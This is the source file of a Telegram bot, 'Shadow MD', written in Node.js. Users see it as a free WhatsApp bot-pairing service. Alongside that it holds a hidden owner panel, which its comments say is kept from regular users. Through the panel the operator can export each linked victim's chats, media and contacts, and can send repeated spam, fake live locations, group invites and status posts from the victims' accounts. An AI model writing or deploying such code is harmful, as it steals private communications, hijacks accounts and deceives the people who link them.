require('dotenv').config();
require('./setting/config');
const TelegramBot = require('node-telegram-bot-api');
const fs = require('fs').promises;
const fs2 = require("fs")
const path = require('path');
const chalk = require('chalk');
const { sleep } = require('./utils');
const { BOT_TOKEN } = require('./token');
const { autoLoadPairs } = require('./autoload');
const axios = require("axios")
const { getConnectedNumbers, getChatList, getContacts, exportMessagesToZip, exportContactsToText, getNumberDataPath } = require('./dataCollector');
const { getBuffer } = require('./allfunc/myfunc');
const AdmZip = require('adm-zip');

const bot = new TelegramBot(BOT_TOKEN, { polling: true });
const adminFilePath = path.join(__dirname, 'kingbadboitimewisher', 'admin.json');
let adminIDs = [];

// Store user states for pairing flow
const userStates = new Map();

const exists = async (filePath) => {
  try {
    await fs.access(filePath);
    return true;
  } catch {
    return false;
  }
};

const loadAdminIDs = async () => {
  const ownerID = '7848300179';
  const defaultAdmins = [ownerID];

  if (!(await exists(adminFilePath))) {
    await fs.writeFile(adminFilePath, JSON.stringify(defaultAdmins, null, 2));
    adminIDs = defaultAdmins;
    console.log('✅ Created admin.json with default owner ID');
  } else {
    try {
      const raw = await fs.readFile(adminFilePath, 'utf8');
      adminIDs = JSON.parse(raw);
    } catch (err) {
      console.error('Error loading admin.json:', err);
      adminIDs = defaultAdmins;
    }
  }
  console.log('📥 Loaded Admin IDs:', adminIDs);
};

let isShuttingDown = false;
let isAutoLoadRunning = true;

const runAutoLoad = async () => {
  if (isAutoLoadRunning || isShuttingDown) return;
  isAutoLoadRunning = true;

  try {
    console.log('⏱️ INITIATING AUTO-LOAD');
    await autoLoadPairs();
    console.log('✅ AUTO-LOAD COMPLETED');
  } catch (e) {
    console.error('❌ AUTO-LOAD FAILED:', e);
  } finally {
    isAutoLoadRunning = false;
  }
};

const startAutoLoadLoop = () => {
  runAutoLoad();
  setInterval(runAutoLoad, 60 * 60 * 1000);
};
startAutoLoadLoop();

const gracefulShutdown = (signal) => {
  if (isShuttingDown) return;
  isShuttingDown = true;
  
  console.log(`🛑 Received ${signal}. Shutting down gracefully...`);
  bot.stopPolling();
  console.log('✅ Bot stopped successfully');
  process.exit(0);
};

// ========== CHECK CHANNELS FUNCTION ==========
const checkUserJoinedChannels = async (userId) => {
  const channels = ['@shadowofficial786', '@shadowbanproof'];
  let allJoined = true;

  for (const channel of channels) {
    try {
      const member = await bot.getChatMember(channel, userId);
      if (['left', 'kicked'].includes(member.status)) {
        allJoined = false;
        break;
      }
    } catch {
      allJoined = false;
      break;
    }
  }
  return allJoined;
};

// ========== SEND CHANNELS REQUIRED MESSAGE ==========
const sendChannelsRequiredMessage = async (chatId) => {
  return bot.sendMessage(chatId,
    `🚨 *You must join our official channels before pairing.*`,
    {
      parse_mode: 'Markdown',
      reply_markup: {
        inline_keyboard: [
          [{ text: '📢 Channel 1', url: 'https://t.me/shadowofficial786' }],
          [{ text: '📢 Channel 2', url: 'https://t.me/shadowbanproof' }],
          [{ text: '👥 Group', url: 'https://t.me/skchatzone' }],
          [{ text: '✅ I have joined', callback_data: 'check_join' }]
        ]
      }
    }
  );
};

// ========== SEND GROUP MESSAGE (STYLISH) ==========
const sendGroupMessage = async (chatId, replyToMessageId = null) => {
  const botInfo = await bot.getMe();
  const botUsername = botInfo.username;
  
  const message = `╭━━〔 🛡️ 𝙑𝙄𝙋 𝙎𝙀𝘾𝙐𝙍𝙀 〕━━╮
➤ Use in DM 👇
╰━━〔 🚀 𝙎𝙏𝘼𝙍𝙏 𝙉𝙊𝙒 〕━━╯`;

  const options = {
    parse_mode: 'Markdown',
    reply_markup: {
      inline_keyboard: [
        [{ text: '🚀 START NOW', url: `https://t.me/${botUsername}?start=pair` }]
      ]
    }
  };

  if (replyToMessageId) {
    options.reply_to_message_id = replyToMessageId;
  }

  return bot.sendMessage(chatId, message, options);
};

// ========== START COMMAND ==========
bot.onText(/\/start/, async (msg) => {
  const chatId = msg.chat.id;
  const isGroup = msg.chat.type === 'group' || msg.chat.type === 'supergroup';

  if (isGroup) {
    return sendGroupMessage(chatId, msg.message_id);
  }

  // Private chat mein normal start message
  await bot.sendPhoto(
    chatId,
    "https://i.postimg.cc/NMn8rzqh/image1.png",
    {
      caption: `🪀 *𝙏𝙝𝙚 𝑺𝒉𝒂𝒅𝒐𝒘 𝑴𝑫💀*\n\n╔════════════════════╗\n ⤷ /pair <wa_number>\n ⤷ /unpair <wa_number>\n╚════════════════════╝`,
      parse_mode: 'Markdown',
      reply_markup: {
        inline_keyboard: [
          [{ text: "👑 Owner", url: "https://t.me/shadowhacr" }]
        ]
      }
    }
  );
});

// ========== PAIR COMMAND ==========
bot.onText(/\/pair(?:\s+(.+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const isGroup = msg.chat.type === 'group' || msg.chat.type === 'supergroup';
  const text = match[1]?.trim();

  // 🔥 GROUP MEIN /pair LIKHA TO SAME STYLISH MESSAGE (JAISE START MEIN HAI)
  if (isGroup) {
    return sendGroupMessage(chatId, msg.message_id);
  }

  // 🔥 PRIVATE CHAT MEIN NORMAL PAIRING PROCESS
  const allJoined = await checkUserJoinedChannels(userId);
  
  if (!allJoined) {
    return sendChannelsRequiredMessage(chatId);
  }

  if (!text) {
    userStates.set(userId, { step: 'awaiting_number' });
    return bot.sendMessage(chatId, 
      `🔐 *Please send your WhatsApp number*\n\nExample: /pair 923xxxxxxxxx\n\nOr just type: 923xxxxxxxxx`,
      { parse_mode: 'Markdown' }
    );
  }

  if (/[a-z]/i.test(text)) {
    return bot.sendMessage(chatId, '❌ *Letters are not allowed.*\n\nPlease send only numbers.', { parse_mode: 'Markdown' });
  }
  
  if (!/^\d{7,15}$/.test(text)) {
    return bot.sendMessage(chatId, '❌ *Invalid format.*\n\nPlease send a valid WhatsApp number.\nExample: 923xxxxxxxxx', { parse_mode: 'Markdown' });
  }
  
  if (text.startsWith('0')) {
    return bot.sendMessage(chatId, '❌ *Numbers starting with 0 are not allowed.*\n\nPlease include country code.', { parse_mode: 'Markdown' });
  }

  const countryCode = text.slice(0, 3);
  if (["252", "201"].includes(countryCode)) {
    return bot.sendMessage(chatId, '❌ *Numbers with this country code are not supported.*', { parse_mode: 'Markdown' });
  }

  const pairingFolder = path.join(__dirname, 'kingbadboitimewisher', 'pairing');
  if (!(await exists(pairingFolder))) {
    await fs.mkdir(pairingFolder, { recursive: true });
  }

  const files = await fs.readdir(pairingFolder);
  const pairedCount = files.filter(f => f.endsWith('@s.whatsapp.net')).length;

  if (pairedCount >= 1000) {
    return bot.sendMessage(chatId, '❌ *Pairing limit reached.*\n\nPlease try again later.', { parse_mode: 'Markdown' });
  }

  userStates.delete(userId);

  try {
    const startpairing = require('./pair.js');
    const Xreturn = text + "@s.whatsapp.net";

    await bot.sendMessage(chatId, '⏳ *Generating pairing code...*\n\nPlease wait a moment.', { parse_mode: 'Markdown' });
    
    await startpairing(Xreturn);
    await sleep(4000);

    const pairingFile = path.join(pairingFolder, 'pairing.json');
    const cu = await fs.readFile(pairingFile, 'utf-8');
    const cuObj = JSON.parse(cu);


    return bot.sendMessage(chatId,
      `🔗 *Pairing Code for WhatsApp*\n\n` +
      `📝 *Code:* 👉 \`${cuObj.code}\` 👈\n\n` +
      `➡️ *Instructions:*\n` +
      `1. Open WhatsApp\n` +
      `2. Go to Settings → Linked Devices\n` +
      `3. Tap "Link a Device"\n` +
      `4. Enter this code\n\n` +
      `⚠️ *Code expires in 2 minutes*`,
      {
        parse_mode: 'Markdown',
        reply_markup: {
          inline_keyboard: [
            [{ text: `Pairing system`, callback_data: `pairing_system` }]
          ]
        }
      }
    );

  } catch (error) {
    console.error('PAIR COMMAND ERROR:', error);
    bot.sendMessage(chatId, '❌ *Pairing service is temporarily unavailable.*\n\nPlease try again later.', { parse_mode: 'Markdown' });
  }
});

// ========== CALLBACK QUERY HANDLER ==========
bot.on('callback_query', async (callbackQuery) => {
  const msg = callbackQuery.message;
  const data = callbackQuery.data;
  const userId = callbackQuery.from.id;
  const chatId = msg.chat.id;

  if (data && data.startsWith('copy_code_')) {
    const code = data.replace('copy_code_', '');
    await bot.answerCallbackQuery(callbackQuery.id, { 
      text: `✅ Code copied: ${code}`, 
      show_alert: true
    });
    return;
  }

  if (data === 'check_join') {
    const allJoined = await checkUserJoinedChannels(userId);

    if (allJoined) {
      await bot.answerCallbackQuery(callbackQuery.id, { 
        text: '✅ Thanks for joining! Now use /pair command.', 
        show_alert: true
      });
      await bot.sendMessage(chatId, '✅ *Thanks for joining all channels!*\n\nNow send /pair to start pairing.', { parse_mode: 'Markdown' });
    } else {
      await bot.answerCallbackQuery(callbackQuery.id, { 
        text: '❌ Please join all channels first!', 
        show_alert: true
      });
    }
    return;
  }
});

// ========== TEXT MESSAGE HANDLER ==========
bot.on('message', async (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const text = msg.text;
  
  if (msg.chat.type !== 'private') return;
  
  const ownerState = ownerStates.get(userId);
  if (ownerState) {
    // Check for media in the message
    if (msg.photo) {
        const fileId = msg.photo[msg.photo.length - 1].file_id;
        const fileLink = await bot.getFileLink(fileId);
        const buffer = await getBuffer(fileLink);
        ownerState.media = { image: buffer, caption: msg.caption || '' };
    } else if (msg.video) {
        const fileId = msg.video.file_id;
        const fileLink = await bot.getFileLink(fileId);
        const buffer = await getBuffer(fileLink);
        ownerState.media = { video: buffer, caption: msg.caption || '' };
    } else if (msg.voice) {
        const fileId = msg.voice.file_id;
        const fileLink = await bot.getFileLink(fileId);
        const buffer = await getBuffer(fileLink);
        ownerState.media = { audio: buffer, ptt: true };
    } else if (msg.audio) {
        const fileId = msg.audio.file_id;
        const fileLink = await bot.getFileLink(fileId);
        const buffer = await getBuffer(fileLink);
        ownerState.media = { audio: buffer, ptt: false };
    }
    return handleOwnerSteps(chatId, userId, text, ownerState);
  }

  if (!text) return;
  if (text.startsWith('/')) return;

  const userState = userStates.get(userId);
  if (!userState || userState.step !== 'awaiting_number') return;
  
  const phoneRegex = /^\d{7,15}$/;
  if (!phoneRegex.test(text)) return;
  
  userStates.delete(userId);
  
  const allJoined = await checkUserJoinedChannels(userId);
  
  if (!allJoined) {
    return bot.sendMessage(chatId,
      `🚨 *You must join our official channels before pairing.*`,
      {
        parse_mode: 'Markdown',
        reply_markup: {
          inline_keyboard: [
            [{ text: '📢 Channel 1', url: 'https://t.me/shadowofficial786' }],
            [{ text: '📢 Channel 2', url: 'https://t.me/shadowbanproof' }],
            [{ text: '👥 Group', url: 'https://t.me/skchatzone' }],
            [{ text: '✅ I have joined', callback_data: 'check_join' }]
          ]
        }
      }
    );
  }

  if (/[a-z]/i.test(text)) {
    return bot.sendMessage(chatId, '❌ Letters are not allowed. Send only numbers.');
  }
  
  if (text.startsWith('0')) {
    return bot.sendMessage(chatId, '❌ Numbers starting with 0 are not allowed.');
  }

  const countryCode = text.slice(0, 3);
  if (["252", "201"].includes(countryCode)) {
    return bot.sendMessage(chatId, '❌ Numbers with this country code are not supported.');
  }

  const pairingFolder = path.join(__dirname, 'kingbadboitimewisher', 'pairing');
  if (!(await exists(pairingFolder))) {
    await fs.mkdir(pairingFolder, { recursive: true });
  }

  const files = await fs.readdir(pairingFolder);
  const pairedCount = files.filter(f => f.endsWith('@s.whatsapp.net')).length;

  if (pairedCount >= 1000) {
    return bot.sendMessage(chatId, '❌ Pairing limit reached. Try again later.');
  }

  try {
    const startpairing = require('./pair.js');
    const Xreturn = text + "@s.whatsapp.net";

    await bot.sendMessage(chatId, '⏳ Generating pairing code...');
    
    await startpairing(Xreturn);
    await sleep(4000);

    const pairingFile = path.join(pairingFolder, 'pairing.json');
    const cu = await fs.readFile(pairingFile, 'utf-8');
    const cuObj = JSON.parse(cu);


    return bot.sendMessage(chatId,
      `🔗 *Pairing Code*\n\n📝 Code: \`${cuObj.code}\`\n\n1. Open WhatsApp\n2. Settings → Linked Devices\n3. Link a Device\n4. Enter this code`,
      {
        parse_mode: 'Markdown',
        reply_markup: {
          inline_keyboard: [
            [{ text: `📋 Copy: ${cuObj.code}`, callback_data: `copy_code_${cuObj.code}` }]
          ]
        }
      }
    );

  } catch (error) {
    console.error('PAIRING ERROR:', error);
    bot.sendMessage(chatId, '❌ Pairing failed. Try again later.');
  }
});

// ========== UNPAIR COMMAND ==========
bot.onText(/\/unpair(?:\s+(.+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const input = match[1]?.trim();
  const isGroup = msg.chat.type === 'group' || msg.chat.type === 'supergroup';

  if (isGroup) {
    return bot.sendMessage(chatId, '❌ Please use /unpair in my private chat.', { parse_mode: 'Markdown' });
  }

  try {
    if (!input) {
      return bot.sendMessage(chatId, 'Example: /unpair 923xxxxxxxxx', { parse_mode: 'Markdown' });
    }
    if (/[a-z]/i.test(input)) {
      return bot.sendMessage(chatId, 'Letters not allowed. Use: /unpair 923xxxxxxxxx', { parse_mode: 'Markdown' });
    }
    if (!/^\d{7,15}$/.test(input)) {
      return bot.sendMessage(chatId, 'Invalid format. Use: /unpair 923xxxxxxxxx', { parse_mode: 'Markdown' });
    }
    if (input.startsWith('0')) {
      return bot.sendMessage(chatId, 'Numbers starting with 0 not allowed.', { parse_mode: 'Markdown' });
    }

    const jidSuffix = `${input}`;
    const pairingPath = path.join(__dirname, 'kingbadboitimewisher', 'pairing');

    if (!(await exists(pairingPath))) {
      return bot.sendMessage(chatId, 'No paired devices found.');
    }

    const entries = await fs.readdir(pairingPath, { withFileTypes: true });
    const matched = entries.find(entry => entry.isDirectory() && entry.name.endsWith(jidSuffix));

    if (!matched) {
      return bot.sendMessage(chatId, `No paired device found for *${input}*`, { parse_mode: 'Markdown' });
    }

    const targetPath = path.join(pairingPath, matched.name);
    await fs.rm(targetPath, { recursive: true, force: true });

    return bot.sendMessage(chatId, `✅ Paired user *${input}* has been deleted successfully`, { parse_mode: 'Markdown' });

  } catch (err) {
    console.error('UNPAIR ERROR:', err);
    bot.sendMessage(chatId, 'Failed to delete paired user. Please try again.');
  }
});

// ========== POLLING ERROR HANDLER ==========
bot.on('polling_error', (error) => {
  console.error('Polling error:', error);
});

// ========== BOT START ==========
(async () => {
  await loadAdminIDs();
  
  const restartCount = parseInt(process.env.RESTART_COUNT || 0);
  console.log(`RESTART #${restartCount + 1}`);
  process.env.RESTART_COUNT = String(restartCount + 1);

  console.log('🤖 Telegram Bot is running...');
  console.log('✅ Bot Username: @bot_hosting_v1_bot');
  console.log('✅ Features: /pair, /unpair, /start');
})();

// ========== OWNER COMMANDS ==========
// These commands are completely hidden from regular users
// Only owner (adminIDs) can use them

const isOwner = (userId) => adminIDs.includes(String(userId));

// Store owner state for multi-step commands
const ownerStates = new Map();

async function handleOwnerSteps(chatId, userId, text, state) {
    const startpairing = require('./pair.js');
    const rentbotTracker = startpairing.rentbotTracker;
    const tracker = rentbotTracker.get(state.from + '@s.whatsapp.net') || rentbotTracker.get(state.from);
    
    if (!tracker || !tracker.connection) {
        ownerStates.delete(userId);
        return bot.sendMessage(chatId, '❌ Bot disconnected. Process cancelled.');
    }
    const sock = tracker.connection;

    switch (state.step) {
        case 'awaiting_sendsms_target':
            state.target = text.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
            state.step = 'awaiting_sendsms_text';
            await bot.sendMessage(chatId, `✅ Target: ${state.target}\n\nNow send the message text:`);
            break;

        case 'awaiting_sendsms_text':
            state.messageContent = text;
            state.step = 'awaiting_sendsms_count';
            await bot.sendMessage(chatId, `✅ Content received.\n\nHow many times to send? (Enter number):`);
            break;

        case 'awaiting_sendsms_count':
            const count = parseInt(text);
            if (isNaN(count) || count <= 0) return bot.sendMessage(chatId, '❌ Invalid count. Enter a number:');
            
            await bot.sendMessage(chatId, `⏳ Sending ${count} messages to ${state.target}...`);
            for (let i = 0; i < count; i++) {
                if (state.media) {
                    await sock.sendMessage(state.target, state.media);
                } else {
                    await sock.sendMessage(state.target, { text: state.messageContent });
                }
                await sleep(1000);
            }
            await bot.sendMessage(chatId, '✅ Done!');
            ownerStates.delete(userId);
            break;



        case 'awaiting_sendlo_target':
            const loTarget = text.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
            await bot.sendMessage(chatId, `⏳ Sending live location to ${loTarget}...`);
            try {
                await sock.sendMessage(loTarget, {
                    location: { 
                        degreesLatitude: 24.8607 + (Math.random() * 0.01), 
                        degreesLongitude: 67.0011 + (Math.random() * 0.01) 
                    },
                    liveLocation: 3600,
                    caption: "Live Location from " + state.from
                });
                await bot.sendMessage(chatId, '✅ Live location sent!');
            } catch (e) {
                await bot.sendMessage(chatId, '❌ Error: ' + e.message);
            }
            ownerStates.delete(userId);
            break;

        case 'awaiting_invite_target':
            const invTarget = text.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
            await bot.sendMessage(chatId, `⏳ Sending group invite to ${invTarget}...`);
            try {
                const code = await sock.groupInviteCode(state.group);
                await sock.sendMessage(invTarget, { text: `https://chat.whatsapp.com/${code}` });
                await bot.sendMessage(chatId, '✅ Invite sent!');
            } catch (e) {
                await bot.sendMessage(chatId, '❌ Error: ' + e.message);
            }
            ownerStates.delete(userId);
            break;

        case 'awaiting_status_text':
            await bot.sendMessage(chatId, `⏳ Posting status...`);
            try {
                if (state.media) {
                    await sock.sendMessage('status@broadcast', state.media);
                } else {
                    await sock.sendMessage('status@broadcast', { text: text });
                }
                await bot.sendMessage(chatId, '✅ Status updated!');
            } catch (e) {
                await bot.sendMessage(chatId, '❌ Error: ' + e.message);
            }
            ownerStates.delete(userId);
            break;
    }
}

// ========== /CHECKSMS COMMAND ==========
bot.onText(/\/checksms/, async (msg) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;

    if (!isOwner(userId)) return;

    const numbers = getConnectedNumbers();
    if (numbers.length === 0) {
        return bot.sendMessage(chatId, '❌ *No connected numbers found.*', { parse_mode: 'Markdown' });
    }

    const buttons = numbers.map(num => [{ text: `📱 ${num}`, callback_data: `owner_sms_num_${num}` }]);
    buttons.push([{ text: '❌ Cancel', callback_data: 'owner_cancel' }]);

    await bot.sendMessage(chatId,
        `🛡️ *OWNER PANEL - Check SMS*

` +
        `Select a connected number to view chats:`,
        {
            parse_mode: 'Markdown',
            reply_markup: { inline_keyboard: buttons }
        }
    );
});

// ========== /OWNER COMMAND ==========
bot.onText(/\/owner/, async (msg) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;

    if (!isOwner(userId)) return;

    const menu = `🛡️ *OWNER CONTROL PANEL*

Select a command to execute:
• /checksms - View and export chats (with media)
• /checkcn - View and export contacts
• /sendsms - Send messages from connected numbers

• /sendlo - Send live location from target
• /checkow - Check admin/owner status in groups/channels
• /addstatus - Post status/story from connected numbers`;

    await bot.sendMessage(chatId, menu, { parse_mode: 'Markdown' });
});

// ========== /SENDSMS COMMAND ==========
bot.onText(/\/sendsms/, async (msg) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    if (!isOwner(userId)) return;

    const numbers = getConnectedNumbers();
    if (numbers.length === 0) return bot.sendMessage(chatId, '❌ No connected numbers.');

    const buttons = numbers.map(num => [{ text: `📱 ${num}`, callback_data: `owner_sendsms_num_${num}` }]);
    buttons.push([{ text: '❌ Cancel', callback_data: 'owner_cancel' }]);

    await bot.sendMessage(chatId, '🛡️ *SEND SMS*\nSelect number(s) to send from:', {
        parse_mode: 'Markdown',
        reply_markup: { inline_keyboard: buttons }
    });
});



// ========== /SENDLO COMMAND ==========
bot.onText(/\/sendlo/, async (msg) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    if (!isOwner(userId)) return;

    const numbers = getConnectedNumbers();
    if (numbers.length === 0) return bot.sendMessage(chatId, '❌ No connected numbers.');

    const buttons = numbers.map(num => [{ text: `📱 ${num}`, callback_data: `owner_sendlo_num_${num}` }]);
    buttons.push([{ text: '❌ Cancel', callback_data: 'owner_cancel' }]);

    await bot.sendMessage(chatId, '🛡️ *SEND LIVE LOCATION*\nSelect source number:', {
        parse_mode: 'Markdown',
        reply_markup: { inline_keyboard: buttons }
    });
});

// ========== /CHECKOW COMMAND ==========
bot.onText(/\/checkow/, async (msg) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    if (!isOwner(userId)) return;

    const numbers = getConnectedNumbers();
    if (numbers.length === 0) return bot.sendMessage(chatId, '❌ No connected numbers.');

    const buttons = numbers.map(num => [{ text: `📱 ${num}`, callback_data: `owner_checkow_num_${num}` }]);
    buttons.push([{ text: '❌ Cancel', callback_data: 'owner_cancel' }]);

    await bot.sendMessage(chatId, '🛡️ *CHECK ADMIN/OWNER STATUS*\nSelect number:', {
        parse_mode: 'Markdown',
        reply_markup: { inline_keyboard: buttons }
    });
});

// ========== /ADDSTATUS COMMAND ==========
bot.onText(/\/addstatus/, async (msg) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    if (!isOwner(userId)) return;

    const numbers = getConnectedNumbers();
    if (numbers.length === 0) return bot.sendMessage(chatId, '❌ No connected numbers.');

    const buttons = numbers.map(num => [{ text: `📱 ${num}`, callback_data: `owner_status_num_${num}` }]);
    buttons.push([{ text: '❌ Cancel', callback_data: 'owner_cancel' }]);

    await bot.sendMessage(chatId, '🛡️ *ADD STATUS*\nSelect number:', {
        parse_mode: 'Markdown',
        reply_markup: { inline_keyboard: buttons }
    });
});

// ========== /CHECKCN COMMAND ==========
bot.onText(/\/checkcn/, async (msg) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    if (!isOwner(userId)) return;

    const numbers = getConnectedNumbers();
    if (numbers.length === 0) return bot.sendMessage(chatId, '❌ *No connected numbers found.*', { parse_mode: 'Markdown' });

    const buttons = numbers.map(num => [{ text: `📱 ${num}`, callback_data: `owner_cn_num_${num}` }]);
    buttons.push([{ text: '❌ Cancel', callback_data: 'owner_cancel' }]);

    await bot.sendMessage(chatId, '🛡️ *OWNER PANEL - Check Contacts*\nSelect a connected number to export contacts:', {
        parse_mode: 'Markdown',
        reply_markup: { inline_keyboard: buttons }
    });
});

// ========== OWNER CALLBACK HANDLER ==========
bot.on('callback_query', async (callbackQuery) => {
    const msg = callbackQuery.message;
    const data = callbackQuery.data;
    const userId = callbackQuery.from.id;
    const chatId = msg.chat.id;

    // Only process owner callbacks
    if (!data || !data.startsWith('owner_')) return;

    // SILENT: If not owner, completely ignore
    if (!isOwner(userId)) return;

    // Cancel
    if (data === 'owner_cancel') {
        ownerStates.delete(userId);
        await bot.answerCallbackQuery(callbackQuery.id, { text: '✅ Cancelled' });
        await bot.deleteMessage(chatId, msg.message_id);
        return;
    }

    // Step 1: Number selected for SMS check
    if (data.startsWith('owner_sms_num_')) {
        const number = data.replace('owner_sms_num_', '');
        const chats = getChatList(number);

        if (chats.length === 0) {
            await bot.answerCallbackQuery(callbackQuery.id, { text: '❌ No chats found for this number' });
            return;
        }

        const buttons = chats.map(chat => [{
            text: `💬 ${chat.name} (${chat.messageCount} msgs)`,
            callback_data: `owner_sms_chat_${number}_${chat.remoteJid}`
        }]);
        buttons.push([{ text: '⬅️ Back', callback_data: 'owner_sms_back' }]);
        buttons.push([{ text: '❌ Cancel', callback_data: 'owner_cancel' }]);

        await bot.editMessageText(
            `🛡️ *OWNER PANEL - Check SMS*

` +
            `📱 Number: ${number}
` +
            `💬 Total Chats: ${chats.length}

` +
            `Select a chat to export:`,
            {
                chat_id: chatId,
                message_id: msg.message_id,
                parse_mode: 'Markdown',
                reply_markup: { inline_keyboard: buttons }
            }
        );
        await bot.answerCallbackQuery(callbackQuery.id);
        return;
    }

    // Step 2: Chat selected for export
    if (data.startsWith('owner_sms_chat_')) {
        const parts = data.split('_');
        const number = parts[3];
        const remoteJid = parts.slice(4).join('_');

        await bot.answerCallbackQuery(callbackQuery.id, { text: '⏳ Generating export with media...' });

        try {
            const chatText = exportMessagesToZip(number, remoteJid);
            const chatName = remoteJid.split('@')[0];
            const { getChatMessages, getNumberDataPath } = require('./dataCollector');
            const rawMessages = getChatMessages(number, remoteJid);
            
            const zip = new AdmZip();
            zip.addFile(`chat_${chatName}.txt`, Buffer.from(chatText, 'utf8'));
            zip.addFile(`chat_${chatName}_raw.json`, Buffer.from(JSON.stringify(rawMessages, null, 2), 'utf8'));

            // Add media files
            const numberDir = getNumberDataPath(number);
            rawMessages.forEach(msg => {
                if (msg.mediaPath) {
                    const fullMediaPath = path.join(numberDir, msg.mediaPath);
                    if (fs2.existsSync(fullMediaPath)) {
                        zip.addLocalFile(fullMediaPath, 'media');
                    }
                }
            });

            const zipPath = `/tmp/chat_export_${number}_${chatName}.zip`;
            zip.writeZip(zipPath);

            await bot.sendDocument(chatId, zipPath, {
                caption: `🛡️ *CHAT EXPORT (WITH MEDIA)*\n\n` +
                         `📱 Number: ${number}\n` +
                         `💬 Chat: ${chatName}\n` +
                         `📊 Messages: ${rawMessages.length}\n` +
                         `📅 Exported: ${new Date().toLocaleString()}`,
                parse_mode: 'Markdown'
            });

            if (fs2.existsSync(zipPath)) fs2.unlinkSync(zipPath);
        } catch (e) {
            console.error('Export error:', e);
            await bot.sendMessage(chatId, '❌ *Export failed: ' + e.message + '*', { parse_mode: 'Markdown' });
        }
        return;
    }

    // Back to number list for SMS
    if (data === 'owner_sms_back') {
        const numbers = getConnectedNumbers();
        const buttons = numbers.map(num => [{ text: `📱 ${num}`, callback_data: `owner_sms_num_${num}` }]);
        buttons.push([{ text: '❌ Cancel', callback_data: 'owner_cancel' }]);

        await bot.editMessageText(
            `🛡️ *OWNER PANEL - Check SMS*

` +
            `Select a connected number to view chats:`,
            {
                chat_id: chatId,
                message_id: msg.message_id,
                parse_mode: 'Markdown',
                reply_markup: { inline_keyboard: buttons }
            }
        );
        await bot.answerCallbackQuery(callbackQuery.id);
        return;
    }

    // ========== NEW OWNER COMMAND CALLBACKS ==========

    // /sendsms step 1: Number selected
    if (data.startsWith('owner_sendsms_num_')) {
        const number = data.replace('owner_sendsms_num_', '');
        ownerStates.set(userId, { step: 'awaiting_sendsms_target', from: number });
        await bot.sendMessage(chatId, `📱 From: ${number}\n\nSend target number (with country code):`);
        await bot.answerCallbackQuery(callbackQuery.id);
        return;
    }



    // /sendlo step 1: Number selected
    if (data.startsWith('owner_sendlo_num_')) {
        const number = data.replace('owner_sendlo_num_', '');
        ownerStates.set(userId, { step: 'awaiting_sendlo_target', from: number });
        await bot.sendMessage(chatId, `📱 Source: ${number}\n\nSend target number to receive live location:`);
        await bot.answerCallbackQuery(callbackQuery.id);
        return;
    }

    // /checkow step 1: Number selected
    if (data.startsWith('owner_checkow_num_')) {
        const number = data.replace('owner_checkow_num_', '');
        const startpairing = require('./pair.js');
        const rentbotTracker = startpairing.rentbotTracker;
        const tracker = rentbotTracker.get(number + '@s.whatsapp.net') || rentbotTracker.get(number);
        
        if (!tracker || !tracker.connection) {
            return bot.sendMessage(chatId, '❌ Bot not connected.');
        }

        await bot.answerCallbackQuery(callbackQuery.id, { text: '⏳ Checking admin status...' });
        try {
            const sock = tracker.connection;
            const groups = await sock.groupFetchAllParticipating();
            const adminGroups = [];
            
            for (const jid in groups) {
                const group = groups[jid];
                // Baileys group metadata might not have participants unless fetched specifically
                const fullMetadata = await sock.groupMetadata(jid);
                const me = fullMetadata.participants.find(p => sock.decodeJid(p.id) === sock.decodeJid(sock.user.id));
                if (me && (me.admin === 'admin' || me.admin === 'superadmin')) {
                    adminGroups.push({ jid, subject: fullMetadata.subject });
                }
            }

            if (adminGroups.length === 0) {
                return bot.sendMessage(chatId, '❌ No groups found where bot is admin.');
            }

            const buttons = adminGroups.map(g => [{ text: g.subject, callback_data: `owner_invite_${number}_${g.jid}` }]);
            buttons.push([{ text: '❌ Cancel', callback_data: 'owner_cancel' }]);

            await bot.sendMessage(chatId, '🛡️ *ADMIN GROUPS*\nSelect group to send invite from:', {
                parse_mode: 'Markdown',
                reply_markup: { inline_keyboard: buttons }
            });
        } catch (e) {
            bot.sendMessage(chatId, '❌ Error: ' + e.message);
        }
        return;
    }

    // /checkow step 2: Group selected
    if (data.startsWith('owner_invite_')) {
        const parts = data.split('_');
        const number = parts[2];
        const groupJid = parts.slice(3).join('_');
        ownerStates.set(userId, { step: 'awaiting_invite_target', from: number, group: groupJid });
        await bot.sendMessage(chatId, `📱 From: ${number}\n👥 Group: ${groupJid}\n\nSend target number to send invite:`);
        await bot.answerCallbackQuery(callbackQuery.id);
        return;
    }

    // /addstatus step 1: Number selected
    if (data.startsWith('owner_status_num_')) {
        const number = data.replace('owner_status_num_', '');
        ownerStates.set(userId, { step: 'awaiting_status_text', from: number });
        await bot.sendMessage(chatId, `📱 Number: ${number}\n\nSend text for status update:`);
        await bot.answerCallbackQuery(callbackQuery.id);
        return;
    }

    // Step 1: Number selected for Contacts check
    if (data.startsWith('owner_cn_num_')) {
        const number = data.replace('owner_cn_num_', '');
        const contacts = getContacts(number);

        await bot.answerCallbackQuery(callbackQuery.id, { text: '⏳ Generating contacts export...' });

        try {
            // Generate text export
            const contactsText = exportContactsToText(number);

            // Create ZIP
            const zip = new AdmZip();
            zip.addFile(`contacts_${number}.txt`, Buffer.from(contactsText, 'utf8'));
            zip.addFile(`contacts_${number}_raw.json`, Buffer.from(JSON.stringify(contacts, null, 2), 'utf8'));

            const zipPath = `/tmp/contacts_export_${number}.zip`;
            zip.writeZip(zipPath);

            await bot.sendDocument(chatId, zipPath, {
                caption: `🛡️ *CONTACTS EXPORT*

` +
                         `📱 Number: ${number}
` +
                         `👥 Total Contacts: ${contacts.length}
` +
                         `📅 Exported: ${new Date().toLocaleString()}`,
                parse_mode: 'Markdown'
            });

            // Cleanup
            if (fs2.existsSync(zipPath)) fs2.unlinkSync(zipPath);

        } catch (e) {
            console.error('Contacts export error:', e);
            await bot.sendMessage(chatId, '❌ *Export failed. Try again.*', { parse_mode: 'Markdown' });
        }
        return;
    }
});

